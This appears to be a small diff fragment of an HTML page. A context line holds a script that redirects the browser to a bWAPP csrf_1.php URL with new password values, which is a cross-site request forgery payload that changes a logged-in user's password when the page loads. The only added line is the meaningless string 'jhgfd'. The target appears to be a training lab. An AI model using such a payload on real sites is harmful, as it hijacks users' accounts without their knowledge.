@@ -6,3 +6,4 @@ document.location="https://bwapp.hakhub.net/csrf_1.php?password_new=manoj1&passw
 </script>
 </body>
 </html>
+jhgfd
